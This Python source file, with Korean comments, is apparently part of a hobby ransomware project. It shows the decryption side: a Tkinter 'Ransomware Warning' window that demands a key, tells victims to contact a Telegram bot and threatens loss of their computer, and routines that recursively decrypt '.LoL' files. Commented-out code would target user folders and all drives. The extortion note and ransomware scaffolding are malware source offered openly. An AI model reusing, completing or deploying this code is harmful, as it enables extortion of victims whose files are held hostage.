import telegram, asyncio                    #텔레그램 송수신용
from nacl.public import PrivateKey, PublicKey, Box     #공개키암호
import nacl, nacl.secret
from datetime import datetime               #시간정보
from time import sleep                      #딜레이
import os, sys, ctypes, tkinter                              #파일 내부 디렉토리
from tkinter import messagebox
from threading import Thread
import threading
import time
from multiprocessing import Process
from PIL import Image, ImageDraw, ImageFont
from tkinter import Label, Entry, Button
import base64

#0. 기본 환경설정
AES_BOX=0
EncryptModule=0
PRIVATE_KEY_AES=0

MaxThread=120
ThreadPool=[]
IsAdmin=ctypes.windll.shell32.IsUserAnAdmin()

PathList=[]
PathList_DEBUG=[]

entry=0

def setEncryptModule(privateKeyAES):
    global EncryptModule

    EncryptModule=nacl.secret.SecretBox(privateKeyAES)
    
class EnDecryptor:
    def __init__(self, files=0, encryptModule=0):
        self._files=files
        self._encryptModule=encryptModule

    def decryptFile(self):
        try:
            for file in self._files:
                if(os.path.isfile(file)==True):
                    if(file==sys.argv[0]):
                        return
                    originName=file.strip(".LoL")
                    with open(file, "rb") as File:
                        data=File.read()
                    decryptedFile=self._encryptModule.decrypt(data)
                    with open(originName, "wb") as File:
                        File.write(decryptedFile)
                    os.remove(file)

        except Exception as e:
            print(f"[DEBUG] Error on EnDecrypt.decryptFile(): {e}")

def listUpTargetDir():
    global PathList, PathList_DEBUG
    #PathList=[r"C:\Users\\"]
    #for letter in range(97, 123):
    #    drive=f"{chr(letter)}:\\"
    #    if (pathlib.Path(drive).exists()):
    #        PathList.append(drive)
    #PathList.remove("c:\\")
    #print(f"[DEBUG] PathList: {PathList}")
    PathList_DEBUG=["E:\\github\\-ransomware\\최지웅\\StarCraft"]#테스트용 타겟 경로"E:\\github\\-ransomware\\최지웅\\test"


def recursiveDecrypt(basepath):
    files=[]
    dirs=[]
    for entry in os.listdir(basepath):
        absolutePath=os.path.join(basepath, entry)
        if os.path.isfile(absolutePath):
            files.append(absolutePath)
        elif os.path.isdir(absolutePath):
            dirs.append(absolutePath)

    if (len(files)>0):
        #th=Thread(target=EnDecryptor(files, EncryptModule).decryptFile())
        #ThreadPool.append(th)
        #th.start()
        EnDecryptor(files, EncryptModule).decryptFile()
    for dir in dirs:
        recursiveDecrypt(dir)

#복호화
def decryptComputer(): #여기서 프로그램 분리시켜야할듯. 현재 이미 AES가 있음.
    global entry
    buf=entry.get()
    print('[DEBUG] entry입력값',type(buf),": "+buf, len(buf))
    AESKey=base64.b64decode(buf)
    print('[DEBUG] AESKey입력값',type(AESKey),": ",AESKey)#이거 모듈 생성 시 키값이 객체로 들어가야하지 않나? 아니네
    try:
        setEncryptModule(AESKey)
    
        for drive in PathList_DEBUG:
            print('[DEBUG] 복호화 시작')
            start=time.time()
            recursiveDecrypt(drive)#암호화 수행
            while (len(ThreadPool)!=0):
                th=ThreadPool.pop()
                th.join()
                print("[DEBUG] join")
            end=time.time()
            print("[DEBUG] 복호화 완료_ 복호화 시간", end-start,' seconds')
    except Exception as e:
        print("AESKey is not correct!", e)

def ransomewareWarning():
    global entry
    WINDOW=tkinter.Tk()
    WINDOW.title('Ransomware Warning')
    WINDOW.geometry('400x100')
    WINDOW.resizable(False, False)

    lab=Label(WINDOW)
    lab['text']='Input Key for Decryption: '
    lab.pack()
    entry=Entry(WINDOW)
    entry.pack()
    lab2=Label(WINDOW)
    lab2['text']='If you turn off this window, You cannot get back your computer:)'
    lab2.pack()
    lab3=Label(WINDOW)
    lab3['text']='Send Message to @rans_key_bot by using telegram'
    lab3.pack()
    btn=Button(WINDOW, text="decrypt!", command=decryptComputer)
    btn.pack()
    
    WINDOW.mainloop()

if __name__=='__main__':
    listUpTargetDir()
    ransomewareWarning()
